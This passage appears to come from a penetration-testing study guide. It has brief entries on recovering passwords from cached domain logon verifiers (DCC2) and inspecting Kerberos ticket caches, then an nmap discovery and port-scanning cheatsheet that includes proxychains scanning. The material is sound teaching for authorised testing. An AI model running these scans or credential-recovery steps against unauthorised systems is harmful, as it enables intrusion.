text: id="variant-10-3-15-1-9">10.3.15.1.9 Find: Recover a password from cached domain logon verifiers Inspect SECURITY/SYSTEM parser output and distinguish cached-domain logon verifiers from local SAM hashes and service secrets. head -n 3 dcc2.txt Recognize: The DCC2 structure and username-associated derivation identify offline cached-logon material. Validate next: Verify iteration/username context, source consistency and current online account state after any recovery. Recover a password from cached domain logon verifiers . <summary

title: 10.3.15.1.10 Find: Classify tickets and use a compatible cache
text: id="variant-10-3-15-1-10">10.3.15.1.10 Find: Classify tickets and use a compatible cache Inspect an existing ticket/cache before collecting new material; identify its client, service, realm and validity. klist -c FILE Recognize: This is service-scoped CIFS material, not a TGT for requesting arbitrary services. Validate next: Check lifetime, cache format, exact SPN/name, route and destination object authorization. Classify tickets and use a compatible cache .

title: 10.4 Discovery and Scanning Cheatsheet
text: id="discovery-and-scanning-cheatsheet">10.4 Discovery and Scanning Cheatsheet ← Cheatsheet index · Complete procedures · Next: service opportunities · Mechanics | Strategy map | Study methods: Discover attack surfaces Use when: an assigned IP/list must become a defensible queue of reachable applications. Replace every placeholder and stay inside explicit scope. <h2

title: 10.4.1 Fast baseline: one directly reachable host
text: id="fast-baseline-one-directly-reachable-host">10.4.1 Fast baseline: one directly reachable host mkdir -p scans ip -br addr ip route get TARGET sudo nmap -sS -n -oA scans/tcp-initial TARGET sudo nmap -sS -n -p- --stats-every 30s -oA scans/tcp-all TARGET nmap -sT -n -sV -sC -p PORTS -oA scans/tcp-services TARGET sudo nmap -sU -n --top-ports 20 -oA scans/udp-top20 TARGET Read: initial TCP gives quick leads; -p- covers TCP 1-65535; -sV -sC acts only on the discovered PORTS; UDP is a separate 20-port sample. Start service enumeration while wider coverage runs. Build one line per useful endpoint: SOURCE -> TARGET | tcp/udp PORT | STATE | APPLICATION EVIDENCE | COVERAGE LIMIT | NEXT TEST Carry that line into the service opportunity sheet and append access context, namespace/object, effective right, result and next action. New hosts/routes/listeners return here; a new credential normally triggers authenticated service re-enumeration instead of an automatic complete rescan. <h2

title: 10.4.2 Command chooser
text: id="command-chooser">10.4.2 Command chooser <h3

title: 10.4.2.1 Check source and route
text: id="check-source-and-route">10.4.2.1 Check source and route ip -br addr ip route get TARGET Decisive output: the intended interface and source address. A route does not prove two-way reachability. <h3

title: 10.4.2.2 Discover an assigned host, list or subnet
text: id="discover-an-assigned-host-list-or-subnet">10.4.2.2 Discover an assigned host, list or subnet nmap -sn -n -oA scans/host TARGET nmap -sn -n -iL targets.txt -oA scans/hosts nmap -sn -n -oA scans/subnet SUBNET Choose SUBNET only when the whole CIDR is assigned. No response is not proof that a host is off. <h3

title: 10.4.2.3 Initial/common TCP selection
text: id="initialcommon-tcp-selection">10.4.2.3 Initial/common TCP selection sudo nmap -sS -n -oA scans/tcp-initial TARGET Coverage: Nmap's 1,000 common TCP ports, not ports 1-1000. <h3

title: 10.4.2.4 Full TCP coverage
text: id="full-tcp-coverage">10.4.2.4 Full TCP coverage sudo nmap -sS -n -p- --stats-every 30s -oA scans/tcp-all TARGET Coverage: TCP 1-65535. This says nothing about UDP. <h3

title: 10.4.2.5 No raw-packet privileges
text: id="no-raw-packet-privileges">10.4.2.5 No raw-packet privileges nmap -sT -n -p- --stats-every 30s -oA scans/tcp-all-connect TARGET Choose connect scanning for ordinary OS connections. A SYN scan normally requires elevated raw-packet access. <h3

title: 10.4.2.6 Known-running target skipped by discovery
text: id="known-running-target-skipped-by-discovery">10.4.2.6 Known-running target skipped by discovery sudo nmap -sS -Pn -n --reason -p PORTS -oA scans/tcp-recheck TARGET -Pn skips liveness proof; it does not fix a bad route. Read actual port responses, not only a host-up label. <h3

title: 10.4.2.7 Selected ports across an assigned list
text: id="selected-ports-across-an-assigned-list">10.4.2.7 Selected ports across an assigned list sudo nmap -sS -n -p PORTS -iL targets.txt -oA scans/tcp-service-sweep Useful for locating one service family. It is not a full port map. <h3

title: 10.4.2.8 TCP through an established SOCKS route
text: id="tcp-through-an-established-socks-route">10.4.2.8 TCP through an established SOCKS route proxychains nmap -sT -Pn -n --top-ports 100 -oA scans/tcp-proxy-top100 TARGET Only ordinary TCP connect calls traverse this route.
